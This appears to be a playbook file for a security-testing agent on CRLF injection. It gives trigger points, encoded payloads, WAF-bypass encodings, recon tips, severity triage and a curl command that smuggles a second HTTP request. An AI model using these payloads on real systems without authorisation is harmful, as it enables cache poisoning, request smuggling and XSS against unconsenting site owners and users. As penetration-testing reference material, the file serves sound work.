# SKILL: crlf-injection
## Trigger Params
Anything user-controlled that gets written into an outbound header/request/
response line before it's sent: redirect/Location target, Set-Cookie value,
custom response headers, raw request-line builders (e.g. curl
--request-target / CURLOPT_REQUEST_TARGET), log lines, mail() / SMTP headers.
## Root cause
Unescaped CR/LF (\r\n, %0d%0a, raw bytes) in a value gets embedded directly
into a header or request/response line, splitting one line into two. Lets
the attacker forge a second header, inject a fake log line, or smuggle a
second request/response.
## Payloads
%0d%0a  (URL-decode happens server-side after a naive literal-CRLF filter)
%0d%0aSet-Cookie:%20sess=evil
%0d%0a%0d%0a<html>...          (response splitting -- forge a full body)
%E5%98%8A%E5%98%8D             (overlong UTF-8 CRLF, dodges some filters)
raw \r\n bytes                 (if the client/tool doesn't URL-encode)
%250d%250a                     (double-encode if value is decoded twice)
Inject straight into a request-target/path builder to smuggle a 2nd request
line onto the wire, not just a header.
## Recon
grep for header values built by string concat instead of a header API, any
--request-target / raw-request-line usage, log statements embedding raw
request params, mail header construction, custom reverse-proxy header
rewriting.
## WAF Bypass Tips
Alternate/overlong encodings of CR and LF, mixed case %0D%0a, double
URL-encoding if the app decodes twice, raw bytes where the transport allows
them unencoded.
## Triage
Forged response/request body or second request smuggled -> Critical/High
(cache poisoning, request smuggling, XSS via injected body). Extra header
only, no body control -> Medium. Log-only injection -> Low unless the log
is parsed/executed unsafely downstream.
## Example
curl --request-target $'/x HTTP/1.1\r\nHost: evil\r\n\r\nGET /y HTTP/1.1' \
  http://target/   (class: CURLOPT_REQUEST_TARGET CRLF, disclosed H1 #4121689)
